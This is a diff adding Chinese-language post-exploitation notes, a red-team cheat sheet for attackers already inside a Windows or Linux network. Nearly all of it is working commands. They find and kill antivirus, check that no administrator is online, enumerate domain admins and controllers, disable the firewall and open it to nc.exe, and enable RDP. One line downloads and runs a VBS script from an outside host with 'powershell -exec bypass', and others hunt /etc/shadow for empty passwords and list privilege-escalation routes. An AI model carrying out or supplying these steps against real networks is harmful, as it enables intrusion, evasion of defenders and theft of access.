@@ -1,0 +1,497 @@
+
+后渗透：
+
+1.查看有哪些防护设备：查看进程：
+tasklist /svc
+复制信息在线查询：
+https://tools.zjun.info/getav/
+发现有安全狗。
+
+
+
+
+taskkill常见用法：
+-t  //终止指定进程
+-f  //强制
+eg1：
+taskkill /pid 3252 -t -f    //强制终止pid为3252的进程
+
+
+
+
+内网信息收集：
+1.windows工作组环境信息收集：
+重点：
+who am i?
+判断用户身份、收集用户信息。
+a1.用户角色信息：
+(1)判断管理员是否在线，规避被管理员发现的风险。
+query user||qwinsta     //查询用户在线情况。 其实其中一个命令就行。
+注：最好不要登3389.
+(2)查看当前计算机名、全名、用户名、系统版本、工作站域、登录域等。
+net config workstation
+(3)判断当前shell对应的用户是否属于管理员组，查看管理员组信息：
+shell net localgroup administrators && whoami
+(4)判断是否需要提权：
+whoami
+net user
+
+
+ipconfig /all           //查看域环境
+systeminfo              //查看域
+net view                //查看跟本机相关的机器名
+net time /domain        //查看域时间、判断主域
+net view /domain        //查询域
+net view /domain:GOD    //查询GOD域内所有的计算机(一般列出的对应的hostname 即机器名)
+nltest /DCLIST:GOD      //查看GOD域的域控的机器名
+
+
+LDAP：域控的轻型目录访问协议。
+
+
+SRV记录是一个域名系统(DNS)资源记录，用于标志承载特定服务的计算机。
+其用于定位有Active Directory的域控。
+
+
+nslookup -type=SRV _ldap._tcp
+或：
+nslookup -type=all _ldap._tcp
+
+定位域控：god.org为域名.
+nslookup -type=all god.org      
+
+
+wmic useraccount get /all       //获取域内用户详细信息
+dsquery user        //查询存在的用户(属于域控命令)
+
+
+
+
+利用nltest定位域控：
+nltest /dclist:domainname
+eg1：
+nltest /dclist:god.org
+
+查询信任域：192.168.52.138为域控ip.   或域控的主机名也行。
+nltest /domain_trusts /all_trusts /v /server:192.168.52.138
+
+
+
+nltest /dsgetdc:god /server:192.168.52.138
+其中god为域名，192.168.52.138为域控ip 或其主机名。
+
+
+
+
+扫描端口：389(ldap)、53(dns)等端口定位域控。
+
+
+
+
+
+
+
+判断是否为虚拟机：
+systeminfo
+systeminfo | findstr /i "系统型号"  //若出现有vmware、virtual等关键字，则很可能是虚拟机。
+vm虚拟机：
+1.存在特定文件，如：vmmouse.sys  
+命令：dir /s c:\windows\system32\drivers | findstr /i "vmmouse.sys"
+其中dir /s c:\windows\system32\drivers表示列出c:\windows\system32\drivers目录下的所有文件或文件夹。
+2.存在特定服务：
+vmtools
+vmrawdsk
+vmvss
+vmscsl
+vmxnet
+vmx_svga
+vmware tools
+命令：sc query     //查看所有服务
+
+findstr /C "sxQzw" /i testz.txt     //从testz.txt文件中查找特定字符sxQzw且不区分大小写
+
+3.存在虚拟网卡：如：virtualbox host-only network
+命令：ipconfig /all
+
+
+架构信息：
+wmic os get osarchitecture
+
+
+
+判断角色：
+普通web服务器、开发测试服务器、公共服务、文件服务器、代理服务器、dns、存储服务器等。
+
+
+
+
+
+where am i?
+判断当前机器在拓扑结构中的位置。是在工作组还是域中。
+
+位置信息：
+1.DMZ区：非军事化区。即外网和内网的中间区域。 一般内网能通过防火墙访问到DMZ区(一般有web服务器)，DMZ区一般不能访问到内网(一般会被防火墙拦截)。
+DMZ区特点：
+内网机器能访问到DMZ;DMZ无法访问内网;外网可以访问到DMZ;一般情况下DMZ不能访问外网(邮件服务器需访问外网)。
+
+2.外网区域。
+3.内网区域：办公区、核心区。
+
+
+
+
+
+what i have?
+判断当前机器运行的组件、端口、服务、路由等。
+进程：重点关注杀软进程。 tasklist /svc
+A：常见杀软进程：360、mcafee、金山卫士、卡巴斯基、windowsdefender、sophos、火绒、qq管家、nod32等。
+B：常见浏览器进程：chrome、firefox、edege、ie等。
+C：终端管理进程：xshell、xftp、securecrt、putty等。
+D：远程桌面管理进程：teamviewer、向日葵等。
+E：常见套装进程：navicat、office套件、foxmail、tortoisesvn、filezilla等。
+D：常见监控系统的agent端进程：zabbix、cacti、nagios等。
+
+系统、补丁、网卡等信息：
+systeminfo
+补丁信息：wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+
+安装的软件信息：
+wmic product get name,version
+
+powershell "Get-WmiObject -class Win32_product | Select-Object -Property name,version"
+
+
+
+
+运行服务：
+net start
+wmic service list brief
+
+
+端口、网络信息：netstat -anto
+其实一般能看到远程连接地址中有域控的ip地址。
+
+计划任务：
+schtasks /query /fo list /v
+
+
+arp表：
+arp -a
+
+路由：
+route print
+
+DNS缓存：
+ipconfig /displaydns
+
+host文件：
+type C:\Windows\System32\drivers\etc\hosts
+
+
+防火墙：
+防火墙状态：
+netsh firewall show state
+防火墙规则：
+netsh advfirewall firewall show rule name=all
+防火墙配置信息：
+netsh firewall show config
+
+关闭防火墙：
+win server 2003及之前版本：netsh firewall set opmode disable
+win server 2003及之后版本：netsh advfirewall set allprofiles state off
+
+
+修改防火墙配置：
+win server 2003及之前版本，允许指定程序全部连接：
+netsh firewall add allowedprogram c:\nc.exe "allow nc" enable
+
+
+win server 2003及之后版本：
+1.允许指定程序连入：
+netsh advfirewall firewall add rule name="pass nc" dir=in action=allow programe="C:\nc.exe"
+2.允许指定程序连出：
+netsh advfirewall firewall add rule name="Allow nc" dir=out action=allow programe="C:\nc.exe"
+
+其实：name的值可以随便写、自定义。
+
+3.允许3389端口放行：
+netsh advfirewall firewall add rule name="zsbxwm" protocol=TCP dir=in localport=3389 action=allow
+
+
+
+
+共享文件夹：
+net share
+wmic share get name,path,status
+
+
+
+远程桌面端口：操作注册表至少需要管理员权限。
+从注册表中查询RDP服务(远程桌面)是否开启：
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v fEnableWinStation
+
+从注册表中查询RDP服务(远程桌面)对应的端口：
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp" /v PortNumber
+
+
+开启3389端口(启动RDP服务)：
+1.通用：
+  wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+2.Win2003:
+  REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+3.Win2008:
+  ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+
+
+查看浏览器代理：
+reg query "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\internet settings"
+
+查看开机时间：
+net statistics workstation
+
+注：查看历史记录、收藏夹、文档等。
+
+
+
+
+windows域信息收集：
+1.我是谁：
+查看域用户信息：
+net user /domain
+net user 用户名 /domain
+
+查看域管：
+net localgroup administrators /domain
+
+查看域工作组：
+net group /domain
+
+查看域管理员用户组：
+net group "domain admins" /domain
+查看企业管理组：
+net group "enterprise admins" /domain
+
+
+
+机器信息：
+查看所有域成员计算机列表：一般以主机名显示。
+net group "Domain computers" /domain
+net view /domain:GOD    //查询GOD域内所有的计算机(一般列出的对应的hostname 即机器名)
+net user liukaifeng01 /domain   //查看域用户密码设置、组等信息。
+
+2.到哪里去：确定目标、机器、域。
+定位域控机器(主机名)：
+net time /domain    //域控充当时间服务器，判断主域
+net group "Domain controllers" /domain
+nltest /dclist:GOD      //查看GOD域的域控的机器名
+
+
+存活主机探测。
+
+利用dns解析记录确认：
+nslookup type=all_ldap.tcp.dc._msdcs.域名
+如：
+nslookup type=all_ldap.tcp.dc._msdcs.god
+
+nslookup type=all_msdcs.域名
+如：
+nslookup type=all_msdcs.god
+
+扫描端口：
+找389(ldap[目录查询协议])、53(dns)端口的机器，通关特定端口定位域控。
+如：
+netstat -anto | findstr "389"
+
+
+
+定位域控用户：
+net group "domain admins" /domain   //查询域管组
+net user /domain                    //查询域用户列表
+wmic useraccount get caption,sid    //查询域用户列表
+
+
+定位域控机器ip：
+ping -n 2 域控机器名
+如：
+ping owa
+
+定位出网机器。
+
+
+域之间的信任关系确定域控：也能查看是否存在其他域。
+nltest /dclist:god
+或
+nltest /dclist:god.org  //看自己的设置
+都行。
+
+
+
+
+域控机器操作：
+列出该域内所有机器名：
+dsquery computer domainroot -limit 65535 && net group "domain computers" /domain
+列出该域内所有用户名：
+dsquery computer domainroot -limit 65535 && net group user /domain
+列出域内分组：
+dsquery group && net group /domain
+
+在域控中查询用户信息：
+net user 用户名 /domain
+如：在域控中查询liukaifeng01的用户信息：
+net user liukaifeng01 /domain
+
+
+
+列出域内组织单位：
+dsquery ou
+
+列出域控：
+dsquery server && net time /domain
+
+
+
+查询是否为虚拟机：linux命令：
+dmidecode -s system-product-name
+
+
+
+
+存活主机探测：
+1.基于ICMP探测主机存活(win)：
+CMD：
+回显模式：有ttl才存在。
+for /l %i in (1,1,255) do @ping 192.168.35.%i -w 1 -n 1 | find /i "ttl"
+导出文本模式：
+for /l %i in (1,1,254) do @ping 192.168.35.%i -w 10 -n 1 | find /i "ttl" >> %temp%\pinzg.txt
+
+
+
+vbs：
+powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://myvps/infoz.vbs','C:\windows\temp\infoz.vbs')     //powershell下载infoz.vbs
+csvript infoz.vbs /b        //后台运行
+结果输出：C:\windows\temp\下。
+
+
+
+
+
+powershell方式：远程下载vbs脚本运行的方式.
+
+
+基于ARP(跟进ip找mac)探测主机存活：
+win：
+poaershell：
+powershell.exe -exec bypass -Command "Import-Module .\Invoke-Arpscan.ps1;Invoke-Arpscan -IPCidr 192.168.43.6/24"
+
+
+nmap：
+nmap -sn -PR 192.168.43.6/24
+
+msf：
+use auxiliary/scanner/discovery/arp_sweep
+
+netdiscover：
+netdiscover -r 192.168.43.6/24 -i wlan0
+
+基于netbios(NBT协议：网络通信协议)探测主机存活(win)：NBT协议默认端口：137、138、139
+nbtscan：
+nbtscan.exe -m 192.168.43.6/24
+nmap：
+nmap -sU --script nbstat.nse -p 136,137,138,139 192.168.43.6/24 -T4
+
+msf：
+use auxiliary/scanner/netbios/nbname
+
+
+
+
+
+linux整体信息收集思路：
+who am i？
+判断用户机器的身份、角色等。
+1.用户角色信息：
+判断管理员是否在线，若在线则最好规避被其发现的风险。
+查看用户信息，是否需提权。
+id、whoami、cat /etc/passwd、last / /var/log/wtmp  	//查看最近登录信息
+grep :0 /etc/passwd 	//寻找特权用户
+
+ps aux 	//进程
+crontab -l -u username 	//查看计划任务
+如：
+crontab -l -u root
+
+iptables -L 	//查看防火墙配置
+netstat -anto 	//查看端口信息
+env、set 		//查看环境变量
+
+查看历史命令：
+history
+history /
+cat ~/.bash_history
+
+编译环境：
+gcc -version
+python -version
+which wget && which curl && which telnet
+
+可用shell：
+cat /etc/shells
+
+查看是否存在空口令用户：
+awk -F: 'length($2)==0 {print$1}' /etc/shadow
+
+系统、cpu、内核信息：
+uname -a
+cat /proc/cpuinfo
+cat /proc/version
+
+
+主机名：
+hostname
+
+是否为容器：
+systemd-detect-virt  		//若输出为none则不是容器
+
+
+是否为虚拟机：
+dmidecode -s system-product-name  	//查看对应的值
+
+
+
+存活主机探测：
+基于icmp探测主机存活(linux)：
+1.回显：
+for i in 192.168.43.{1..254}; do if ping -c 3 -w 3 $i &>/dev/null; then echo $i is alived;fi;done
+
+基于netbios探测主机存活(仅适用于win)：
+./nbtscan 192.168.43.6/24
+
+
+nmap探测：
+nmap -sT -p 445,139,136 -Pn -T2 --open -v --script=smb-os-discovery.nse,smb-enum-shares.nse,smb-vuln-ms08-067.nse 192.168.43.0/24 -oN resulz.txt
+
+
+win上线马格式一般为exe
+linux上线马格式一般为elf(即一般二进制文件的格式)
+
+内网扫描探测时最好调低线程。
+
+
+
+
+
+
+linux提权重点手法：
+脏牛漏洞。
+crontab定时任务提权。
+suid提权。
+sudo配置错误提权。
+
+
+windows高版本(>=10)中：
+trustedinstaller(最高权限，可修改系统文件。全名：NT SERVICE\TrustedInstaller)>nt authority\system>administrator权限>普通用户权限。
+
+
+
+
